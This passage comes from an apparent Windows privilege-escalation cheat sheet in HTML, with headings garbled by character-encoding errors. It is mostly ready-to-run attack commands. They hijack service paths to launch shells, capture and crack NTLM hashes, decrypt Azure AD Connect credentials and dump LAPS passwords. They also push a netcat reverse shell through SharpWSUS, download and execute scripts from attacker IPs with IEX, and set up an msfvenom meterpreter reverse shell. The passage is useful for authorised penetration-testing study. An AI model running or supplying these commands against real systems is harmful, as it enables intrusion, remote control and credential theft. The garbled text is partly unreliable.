<li>å¦‚æœæ‚¨æœ‰<code>GenericWrite</code>ä»»ä½•æœåŠ¡</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check the command</span><br>sc.exe <br><br><span class="hljs-comment">## ------------------| å¦‚æœå®ƒæ˜¯æˆåŠŸçš„ï¼Œé‚£ä¹ˆExploitã€”Space mustã€•</span><br>sc.exe config UsoSVC binpath= <span class="hljs-string">&quot;\&quot;</span>c:\windows\system32\cmd.exe /c powershell C:\\Windows\\system32\\spool\\drivers\\color\\rev.ps1\<span class="hljs-string">&quot;&quot;</span>   <br>sc.exe stop UsoSVC <br>sc.exe config UsoSVC <span class="hljs-built_in">start</span>=auto<br>sc.exe <span class="hljs-built_in">start</span> UsoSVC <br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ æœ‰<code>xp_dirtree</code>ï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Turn on responder</span><br>sudo responder <span class="hljs-literal">-i</span> tun0<br><br><span class="hljs-comment">## Execute </span><br>sqlcmd <span class="hljs-literal">-Q</span> <span class="hljs-string">&quot;xp_dirtree \\YourIP\test&quot;</span><br><br><span class="hljs-comment">## Get the NTLM hash and crack with </span><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">5600</span> hash /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ åœ¨<code>Azure Admins</code>ç»„é‡Œï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Read this blog</span><br>https://blog.xpnsec.com/azu<span class="hljs-built_in">read-connect</span><span class="hljs-literal">-for-redteam</span>/<br><br><span class="hljs-comment">## æ–¹æ³•è®º</span><br><span class="hljs-variable">$client</span> = <span class="hljs-built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;Server=localhost;Integrated Security=true;Initial Catalog=ADSync&quot;</span><br><span class="hljs-variable">$client</span>.Open()<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$key_id</span> = <span class="hljs-variable">$reader</span>.GetInt32(<span class="hljs-number">0</span>)<br><span class="hljs-variable">$instance_id</span> = <span class="hljs-variable">$reader</span>.GetGuid(<span class="hljs-number">1</span>)<br><span class="hljs-variable">$entropy</span> = <span class="hljs-variable">$reader</span>.GetGuid(<span class="hljs-number">2</span>)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">0</span>)<br><span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">1</span>)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-built_in">add-type</span> <span class="hljs-literal">-path</span> <span class="hljs-string">&#x27;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#x27;</span><br><span class="hljs-variable">$km</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager<br><span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetActiveCredentialKey([<span class="hljs-type">ref</span>]<span class="hljs-variable">$key</span>)<br><span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetKey(<span class="hljs-number">1</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$key2</span>)<br><span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$decrypted</span>)<br><br><span class="hljs-variable">$domain</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$decrypted</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">&quot;//attribute&quot;</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>&#123;Name = <span class="hljs-string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerText&#125;&#125;<br><br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Domain: &quot;</span> + <span class="hljs-variable">$domain</span>.Domain)<br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Username: &quot;</span> + <span class="hljs-variable">$username</span>.Username)<br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">&quot;Password: &quot;</span> + <span class="hljs-variable">$password</span>.Password)<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœæ‚¨æ˜¯å›¢ä½“æˆå‘˜<code>Event Log Readers</code>ã€‚</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/RamblingCookieMonster/PowerShell/master/<span class="hljs-built_in">Get-WinEventData</span>.ps1  <br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.14.25/Get-WinEventData.ps1&#x27;</span>)<br><br><span class="hljs-comment"># æ˜¾ç¤ºç”Ÿæˆäº‹ä»¶çš„è®¡ç®—æœºã€æ—¶é—´å’Œä»»ä½•è‡ªå®šä¹‰äº‹ä»¶æ•°æ®çš„ç®€å•ç¤ºä¾‹</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-LogName</span> system <span class="hljs-literal">-max</span> <span class="hljs-number">1</span> | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-Property</span> MachineName, TimeCreated, e_*  <br><br><span class="hljs-comment"># åœ¨åŸŸæ§åˆ¶å™¨ä¸ŠæŸ¥æ‰¾é”å®šäº‹ä»¶</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-ComputerName</span> DomainController1 <span class="hljs-literal">-FilterHashtable</span> <span class="hljs-selector-tag">@</span>&#123;Logname=<span class="hljs-string">&#x27;security&#x27;</span>;id=<span class="hljs-number">4740</span>&#125; <span class="hljs-literal">-MaxEvents</span> <span class="hljs-number">10</span> | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> TimeCreated, e_TargetUserName, e_TargetDomainName     <br><br><span class="hljs-comment">#  å‘½ä»¤è¡Œè¿›ç¨‹ç™»å½•ï¼ˆå·²åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼‰</span><br><span class="hljs-built_in">Get-WinEvent</span> <span class="hljs-literal">-FilterHashtable</span> <span class="hljs-selector-tag">@</span>&#123;Logname=<span class="hljs-string">&#x27;security&#x27;</span>;id=<span class="hljs-number">4688</span>&#125; | <span class="hljs-built_in">Get-WinEventData</span> | <span class="hljs-built_in">Select</span> TimeCreated,MachineName,e_CommandLine | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-autosize</span> <span class="hljs-literal">-wrap</span><br><br><span class="hljs-comment">## æŸ¥çœ‹æ­¤çª—å£äº‹ä»¶ä»£ç </span><br>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ åœ¨<code>WSUS Administrators</code>ç»„é‡Œï¼Ÿ<a target="_blank" rel="noopener" href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/SharpWSUS/SharpWSUS.exe<br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/PsExec64/PsExec64.exe <span class="hljs-literal">-O</span> psexec.exe                               <br><br>.\SharpWSUS.exe create /payload:<span class="hljs-string">&quot;C:\Users\sflowers\Documents\psexec.exe&quot;</span> /args:<span class="hljs-string">&quot;-accepteula -s -d -accepteula -s -d C:\\Users\\sflowers\\Documents\\nc.exe -e cmd 10.10.14.4 4545&quot;</span> /title:<span class="hljs-string">&quot;LocalUpdate&quot;</span>               <br>.\SharpWSUS.exe approve /updateid:&lt;ID&gt; /computername:&lt;HOSTNAME.DOMAIN&gt; /groupname:<span class="hljs-string">&quot;LocalUpdate&quot;</span><br><span class="hljs-comment">### Wait for 5-6 minutes</span><br>.\SharpWSUS.exe check /updateid:&lt;ID&gt; /computername:&lt;HOSTNAME.DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœæ‚¨æ˜¯å›¢ä½“æˆå‘˜<code>Administrators</code>ï¼Œä½†ä»è¢«å›°ä½ï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## åˆ—å‡ºç®¡ç†å‘˜ç»„æˆå‘˜</span><br>net localgroup Administrators<br><br><span class="hljs-comment">## ä½¿ç”¨è¿™ç§ç®€å•çš„æ–¹æ³•ç»•è¿‡UAC</span><br>net use <span class="hljs-built_in">h</span>: \\<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">h</span>:<br><span class="hljs-built_in">dir</span> <br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ åœ¨<code>LAPS_Readers</code></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><br>Computers = <span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Properties</span> ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-variable">$Computers</span> | <span class="hljs-built_in">Sort-Object</span> ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span> | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span> Name, DnsHostName, ms<span class="hljs-literal">-Mcs-AdmPwd</span>, ms<span class="hljs-literal">-Mcs-AdmPwdExpirationTime</span><br><span class="hljs-variable">$computers</span> | <span class="hljs-built_in">Export-Csv</span> <span class="hljs-literal">-path</span> c:\windows\temp\laps.csv<span class="hljs-string">&quot; -NoTypeInformation</span><br></code></pre></td></tr></table></figure>

<ul>
<li>åŠ«æŒ&#x2F;è¿ç§»ç™»å½•ä¼šè¯ã€‚</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| æ£€æŸ¥è°ç™»å½•äº†æœºå™¨ï¼Œæœ‰å“ªäº›ä¼šè¯å¯ç”¨ï¼Ÿ </span><br>tasklist /v <br><br><span class="hljs-comment">## ------------------| è¿›å…¥ä¼šè¯</span><br><span class="hljs-comment">## Create payload </span><br>msfvenom <span class="hljs-literal">--platform</span> windows <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> exe &gt; h4rithd.exe   <br>sudo msfdb run <br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST tun0<br><span class="hljs-built_in">set</span> LPORT &lt;PORT&gt;<br>run<br>meterpreter &gt; <span class="hljs-built_in">ps</span><br><span class="hljs-comment">## æœç´¢explorer.exeï¼›å› ä¸ºå®ƒæ›´ç¨³å®šï¼Œç„¶åå¤åˆ¶PIDå€¼</span><br>migrate &lt;PID&gt;<br></code></pre></td></tr></table></figure>

<h3 id="01-3-æœåŠ¡-æ³¨å†Œè¡¨æ¼æ´"><a href="#01-3-æœåŠ¡-æ³¨å†Œè¡¨æ¼æ´" class="headerlink" title="01.3 æœåŠ¡&#x2F;æ³¨å†Œè¡¨æ¼æ´"></a>01.3 æœåŠ¡&#x2F;æ³¨å†Œè¡¨æ¼æ´</h3><ul>
<li><a target="_blank" rel="noopener" href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">ä¸å®‰å…¨çš„æœåŠ¡æƒé™</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| æšä¸¾[å¿…é¡»å…·æœ‰SERVICE_STARTå’ŒSERVICE_STOPæƒé™]</span><br>.\winPEASany.exe quiet servicesinfo<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">Select-Object</span> Name, State, PathName | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.State <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;Running&#x27;</span>&#125; | findstr <span class="hljs-string">&quot;Program&quot;</span>     <br><br><span class="hljs-comment">## ------------------| æ£€æŸ¥æƒé™</span><br>icacls <span class="hljs-string">&quot;C:\Program Files\...\&lt;PATH&gt;\..\pro.exe&quot;</span><br><span class="hljs-comment">### Check BUILTIN\Users:(I)(F) permission</span><br><br><span class="hljs-comment">## ------------------| æ£€æŸ¥ç‰¹å®šçš„æœåŠ¡åç§°</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> <span class="hljs-string">&quot;Authenticated Users&quot;</span> *<br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br>accesschk.exe /accepteula <span class="hljs-literal">-ucqv</span> &lt;ServiceName&gt;<br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-comment">## æ£€æŸ¥å½“å‰çŠ¶æ€</span><br><span class="hljs-built_in">sc</span> qc &lt;service_name&gt;<br><span class="hljs-built_in">sc</span> query &lt;service_name&gt;<br><span class="hljs-comment">## è®¾ç½®äºŒè¿›åˆ¶è·¯å¾„</span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; binpath= <span class="hljs-string">&quot;\&quot;</span>C:\Windows\Temp\shell.exe\<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">## Start service</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt;<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br><span class="hljs-comment">## è®¾ç½®è‡ªåŠ¨å¯åŠ¨</span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; <span class="hljs-built_in">start</span>= auto<br><span class="hljs-comment">## åˆ é™¤ç›¸å…³æ€§ </span><br><span class="hljs-built_in">sc</span> config &lt;service_name&gt; depend= <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment">## ------------------| Restart service </span><br>cmd<br>wmic service <span class="hljs-built_in">where</span> caption=<span class="hljs-string">&quot;&lt;ServiceName&gt; get name, caption, state, startmode</span><br><span class="hljs-string">## å¦‚æœStartModeä¸ºAuto</span><br><span class="hljs-string">## æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰é‡æ–°å¯åŠ¨æœºå™¨çš„ç‰¹æƒ</span><br><span class="hljs-string">whoami /priv</span><br></code></pre></td></tr></table></figure>

<ul>
<li>ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check </span><br><span class="hljs-comment">### RW Everyone / æ‰€æœ‰äººå‘˜å‡å¯è¯»å†™</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-quvw</span> <span class="hljs-string">&quot;C:\&lt;PATH&gt;.exe&quot;</span><br><span class="hljs-comment">### SERVICE_START &amp; SERVICE_STOP æƒé™ </span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-comment">## å¤‡ä»½åŸå§‹æ–‡ä»¶ï¼Œç„¶åç”¨shell.exeæ›¿æ¢</span><br><span class="hljs-comment">## Start the service</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br></code></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/03/09/unquoted-service-path/">ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| ç®€ä»‹</span><br>C:\Program Files\One Folder\Two Folder\Executable.exe<br>C:\Program.exe<br>C:\Program Files\One.exe<br>C:\Program Files\One Folder\Two.exe<br>C:\Program Files\A Subfolder\Two Folder\Executable.exe<br><br><span class="hljs-comment">## ------------------| æ£€æŸ¥æœªç¡®å®šçš„è·¯å¾„</span><br>wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;c:\windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&#x27;&quot;</span><br><br><span class="hljs-comment">## ------------------| Check if we have </span><br><span class="hljs-comment">### SERVICE_START &amp; SERVICE_STOP æƒé™</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> user &lt;service_name&gt;<br><span class="hljs-comment">###  å†™å…¥æƒé™ [RW BUILTIN\Users]</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uwcqv</span> <span class="hljs-literal">-uwdq</span> &lt;path&gt;<br><br><span class="hljs-comment">## ------------------| ä»£æ›¿ &amp; start service</span><br><span class="hljs-built_in">move</span> payload.exe <span class="hljs-string">&quot;C:\Program Files\...\&lt;SUB DIR&gt;\&lt;SUB&gt;.exe&quot;</span><br>net <span class="hljs-built_in">start</span> &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> STOP &lt;service_name&gt; <br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">START</span> &lt;service_name&gt; <br></code></pre></td></tr></table></figure>

<ul>
<li>æ³¨å†Œè¡¨æƒé™è¾ƒå¼±</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Verify [Check for RW NT AUTHORITY\INTERACTIVE]</span><br><span class="hljs-built_in">Get-Acl</span> HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; | <span class="hljs-built_in">Format-List</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-uvwqk</span> HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; <br><br><span class="hljs-comment">## ------------------| Check if we can start the service</span><br>.\accesschk.exe /accepteula <span class="hljs-literal">-ucqv</span> user &lt;ServiceName&gt;<br><br><span class="hljs-comment">## ------------------| Check Current values [ImagePath &amp; ObjectName == LocalSystem]</span><br>reg query HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; <br><br><span class="hljs-comment">## ------------------| Add new value</span><br>reg add HKLM:\&lt;ServicePath&gt;\&lt;ServiceName&gt; /v ImageaPath /t REG_EXPAND_SZ /d C:\Windows\Temp\shell.exe /f    <br>net <span class="hljs-built_in">start</span> &lt;service_name&gt;                <br></code></pre></td></tr></table></figure>

<h2 id="02-å·¥å…·"><a href="#02-å·¥å…·" class="headerlink" title="02.å·¥å…·"></a>02.å·¥å…·</h2><h3 id="02-1-PowerUp-ps1"><a href="#02-1-PowerUp-ps1" class="headerlink" title="02.1 PowerUp.ps1"></a>02.1 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download and execute</span><br>C:\windows\sysnative\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.26/PowerUp.ps1&#x27;)&quot;</span> <br><br><span class="hljs-comment">## ------------------| æ‰‹åŠ¨å¯¼å…¥æ¨¡å—</span><br><br><span class="hljs-built_in">Import-Module</span> ./PowerUp.ps1<br><br><span class="hljs-comment">## ------------------| æœ€ä½³æ£€æŸ¥</span><br><span class="hljs-built_in">Invoke-AllChecks</span><br>CurrentUserTokenGroupSid <br><span class="hljs-built_in">Get-RegistryAutoLogon</span><br><br><span class="hljs-comment">## ------------------| Check other functions</span><br><span class="hljs-built_in">cat</span> PowerUp.ps1 | grep <span class="hljs-literal">-Ei</span> <span class="hljs-string">&#x27;^function&#x27;</span> | grep <span class="hljs-string">&#x27;&#123;$&#x27;</span> | grep <span class="hljs-string">&#x27;-&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="02-2-PowerUpSQL"><a href="#02-2-PowerUpSQL" class="headerlink" title="02.2 PowerUpSQL"></a><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL">02.2 PowerUpSQL</a></h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">å•å‡»æ­¤å¤„æŸ¥çœ‹å¤‡å¿˜å•ï¼</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Download </span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1<br><br><span class="hljs-comment"># Upload </span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://10.10.14.26/PowerUpSQL.ps1&#x27;</span>)<br><br><span class="hljs-comment"># Execute commands</span><br><span class="hljs-built_in">Get-SQLInstanceLocal</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLUncPathInjection</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLImpersonateService</span> <span 